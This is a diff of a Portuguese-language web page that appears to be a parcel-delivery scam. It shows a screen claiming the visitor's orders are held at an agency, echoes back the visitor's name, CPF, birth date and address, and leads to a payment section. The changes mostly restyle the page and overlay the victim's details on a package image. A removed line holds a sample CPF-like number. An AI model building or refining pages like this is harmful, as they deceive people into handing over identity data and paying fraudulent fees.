@@ -457,7 +457,7 @@
     .rotate {
       text-align: start;
       transform: rotate(2deg);
-      color: black !important; /* Garante texto preto */
+      color: #555 !important; /* Alterado para cinza */
       font-weight: bold;
       opacity: 0.5;
       text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
@@ -498,48 +498,13 @@
       left: 55%;
       transform: translate(-50%, -50%);
       background-color: transparent;
-      color: black !important;
+      color: #555 !important; /* Alterado para cinza */
       padding: 10px 20px;
-      font-size: 12px;
+      font-size: 12px; /* Tamanho padrão para mobile */
       text-align: center;
       border-radius: 5px;
       width: 80%;
       max-width: 350px;
-    }
-
-    .rotate {
-      text-align: start;
-      transform: rotate(2deg);
-      color: black !important;
-      font-weight: bold;
-      opacity: 0.7;
-      text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
-      transform-style: preserve-3d;
-      transform: rotateX(1.2deg) rotateY(55deg);
-    }
-    
-    /* Efeito de piscar para atenção */
-    #blink {
-      animation: blink 1s infinite;
-    }
-    
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.3; }
-      100% { opacity: 1; }
-    }
-    
-    /* Melhorias no botão */
-    #btn-pagar {
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 100%;
-    }
-    
-    #btn-pagar:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
     }
 
     /* Efeito de piscar para atenção */
@@ -567,27 +532,19 @@
     }
 
     /* MODIFICAÇÕES PARA RESPONSIVIDADE */
-    @media (max-width: 768px) {
-      #pagamento {
-        padding: 1rem;
-        width: 100%;
+    @media (min-width: 768px) {
+      /* Ajustes para desktop */
+      .overlay-text {
+        font-size: 8px !important; /* Tamanho menor para desktop */
       }
       
-      .container {
-        height: 180px;
-      }
-      
-      #btn-pagar {
-        font-size: 0.9rem;
-        padding: 0.5rem;
-      }
-      
-      .status-value, .alert-title {
-        font-size: 14px;
+      #caixa-info-1, #caixa-info-2 {
+        font-size: 8px !important;
       }
     }
 
-    @media (max-width: 480px) {
+    @media (max-width: 767px) {
+      /* Ajustes para mobile */
       #top-bar {
         font-size: 12px;
       }
@@ -610,6 +567,14 @@
       
       #btn-pagar {
         font-size: 0.8rem;
+      }
+      
+      .overlay-text {
+        font-size: 12px !important; /* Tamanho maior para mobile */
+      }
+      
+      #caixa-info-1, #caixa-info-2 {
+        font-size: 12px !important;
       }
     }
   </style>
@@ -669,23 +634,23 @@
     </section>
 
     <!-- Tela Resultado -->
-<section id="resultado" style="text-align: center; font-family: Arial, sans-serif;">
-  <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-  <p><span style="font-weight: normal; color: black;">Nome:</span> <span id="res-nome" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">CPF:</span> <span id="res-cpf" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Nascimento:</span> <span id="res-nascimento" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">CEP:</span> <span id="res-cep" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Rua:</span> <span id="res-rua" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Bairro:</span> <span id="res-bairro" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Cidade:</span> <span id="res-cidade" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Estado:</span> <span id="res-estado" style="font-weight: bold; color: black;"></span></p>
-  <p><span style="font-weight: normal; color: black;">Prazo para Regularização:</span> <span id="res-prazo" style="color: black; font-weight: bold;"></span></p>
+    <section id="resultado" style="text-align: center; font-family: Arial, sans-serif;">
+      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+      <p><span style="font-weight: normal; color: black;">Nome:</span> <span id="res-nome" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">CPF:</span> <span id="res-cpf" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Nascimento:</span> <span id="res-nascimento" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">CEP:</span> <span id="res-cep" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Rua:</span> <span id="res-rua" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Bairro:</span> <span id="res-bairro" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Cidade:</span> <span id="res-cidade" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Estado:</span> <span id="res-estado" style="font-weight: bold; color: black;"></span></p>
+      <p><span style="font-weight: normal; color: black;">Prazo para Regularização:</span> <span id="res-prazo" style="color: black; font-weight: bold;"></span></p>
 
-  <div class="btn-container">
-    <button id="btn-sim-sou-eu">SIM SOU EU</button>
-    <a href="#" id="nao-sou-eu">não sou eu</a>
-  </div>
-</section>
+      <div class="btn-container">
+        <button id="btn-sim-sou-eu">SIM SOU EU</button>
+        <a href="#" id="nao-sou-eu">não sou eu</a>
+      </div>
+    </section>
 
     <!-- Tela Pagamento - MODIFICADA PARA LARGURA MAIOR -->
     <section id="pagamento">
@@ -717,22 +682,22 @@
       </div>
 
       <section class="mt-3 p-4 w-95 max-w-1200" style="margin:0 auto;">
-  <div class="container">
-    <div class="overlay">
-      <div class="overlay-text">
-        <p class="rotate" style="margin-top:28%; margin-right:0%; font-size: 30%; color: black !important;"> 
-          NOME: <span id="pag-nome" style="color: black !important;">Cliente Exemplo</span><br>
-          CPF: <span id="pag-cpf" style="color: black !important;">209.068.077-60</span>
-        </p>
-        <p class="rotate" style="margin-top:10%; font-size: 30%; color: black !important;"> 
-          RUA: <br>
-          BAIRRO: <br>
-          CIDADE: <span id="pag-cidade" style="color: black !important;">São Paulo</span>
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
+        <div class="container">
+          <div class="overlay">
+            <div class="overlay-text">
+              <p class="rotate" style="margin-top:28%; margin-right:0%; color: #555 !important;" id="caixa-info-1"> 
+                NOME: <span id="pag-nome" style="color: #555 !important;"></span><br>
+                CPF: <span id="pag-cpf" style="color: #555 !important;"></span>
+              </p>
+              <p class="rotate" style="margin-top:10%; color: #555 !important;" id="caixa-info-2"> 
+                RUA: <span id="pag-rua" style="color: #555 !important;"></span><br>
+                BAIRRO: <span id="pag-bairro" style="color: #555 !important;"></span><br>
+                CIDADE: <span id="pag-cidade" style="color: #555 !important;"></span>
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
 
       <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
         <ul style="list-style: none; padding-left: 0;">
